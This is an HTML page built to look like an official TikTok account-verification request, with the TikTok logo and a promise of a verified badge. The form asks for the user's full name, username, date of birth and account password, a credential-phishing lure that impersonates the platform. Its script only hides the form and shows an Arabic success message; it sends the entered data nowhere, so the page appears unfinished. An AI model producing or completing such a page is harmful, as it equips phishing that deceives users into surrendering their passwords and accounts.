<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Verification Request</title>
  <style>
    :root {
      --primary: #ff0050;
      --background: #fdfdfd;
      --text: #222;
      --muted: #666;
      --input-bg: #f5f5f5;
      --border: #ddd;
      --success-bg: #4CAF50;
      --hover-bg: #e60045;
      --btn-radius: 10px;
      --transition-time: 0.3s;
    }

    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      margin: 0;
      padding: 0;
      background-color: var(--background);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .form-wrapper {
      width: 100%;
      max-width: 420px;
      background: #fff;
      padding: 40px 30px;
      border-radius: 18px;
      box-shadow: 0 20px 50px rgba(0,0,0,0.1);
      transform: translateY(50px);
      opacity: 0;
      animation: fadeInUp 1s forwards;
    }

    .form-wrapper img {
      width: 60px;
      display: block;
      margin: 0 auto 10px;
    }

    .form-wrapper h2 {
      text-align: center;
      font-size: 22px;
      margin-bottom: 8px;
      color: var(--text);
    }

    .form-wrapper p {
      text-align: center;
      font-size: 14px;
      color: var(--muted);
      margin-bottom: 25px;
    }

    label {
      font-size: 14px;
      color: var(--text);
      display: block;
      margin-bottom: 6px;
      margin-top: 16px;
    }

    input {
      width: 100%;
      padding: 12px;
      border: 1px solid var(--border);
      border-radius: var(--btn-radius);
      background-color: var(--input-bg);
      font-size: 14px;
      transition: 0.3s;
      margin-bottom: 16px;
    }

    input:focus {
      outline: none;
      border-color: var(--primary);
      background-color: #fff;
    }

    button {
      margin-top: 30px;
      width: 100%;
      background-color: var(--primary);
      color: #fff;
      border: none;
      border-radius: var(--btn-radius);
      padding: 13px;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: var(--hover-bg);
    }

    #confirmationMessage {
      display: none;
      margin-top: 30px;
      padding: 12px;
      background-color: var(--success-bg);
      color: white;
      border-radius: var(--btn-radius);
      font-size: 16px;
      text-align: center;
      opacity: 0;
      transform: translateY(20px);
      transition: opacity 1s, transform 1s;
    }

    .note {
      text-align: center;
      font-size: 12px;
      color: var(--muted);
      margin-top: 20px;
    }

    /* Keyframe animations */
    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(50px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @media (max-width: 480px) {
      .form-wrapper {
        padding: 25px 20px;
      }
    }
  </style>
</head>
<body>
  <div class="form-wrapper">
    <img src="https://upload.wikimedia.org/wikipedia/en/6/69/TikTok_logo.svg" alt="TikTok Logo">
    <h2>Request Account Verification</h2>
    <p>Complete the form to request your verified badge on TikTok.</p>
    <form id="verificationForm">
      <label for="fullname">Full Name</label>
      <input type="text" id="fullname" placeholder="e.g., John Doe" required>

      <label for="username">TikTok Username</label>
      <input type="text" id="username" placeholder="@username" required>

      <label for="password">Account Password</label>
      <input type="password" id="password" placeholder="••••••••" required>

      <label for="dob">Date of Birth</label>
      <input type="date" id="dob" value="2000-01-01" required>

      <button type="submit">Submit Request</button>
    </form>
    <div id="confirmationMessage">تم توثيق الحساب بنجاح! سيتم التحقق من حسابك قريبًا.</div>
    <div class="note">Your request will be reviewed within 3–5 business days.</div>
  </div>

  <script>
    document.getElementById('verificationForm').addEventListener('submit', function(event) {
      event.preventDefault();

      // إخفاء النموذج بعد الإرسال مع تأثير الظهور
      document.querySelector('.form-wrapper').style.display = 'none';

      // عرض رسالة التأكيد مع تأثير الظهور
      const confirmationMessage = document.getElementById('confirmationMessage');
      confirmationMessage.style.display = 'block';
      
      // إضافة التأثيرات بعد تأخير بسيط
      setTimeout(() => {
        confirmationMessage.style.opacity = 1;
        confirmationMessage.style.transform = 'translateY(0)';
      }, 100);
    });
  </script>
</body>
</html>
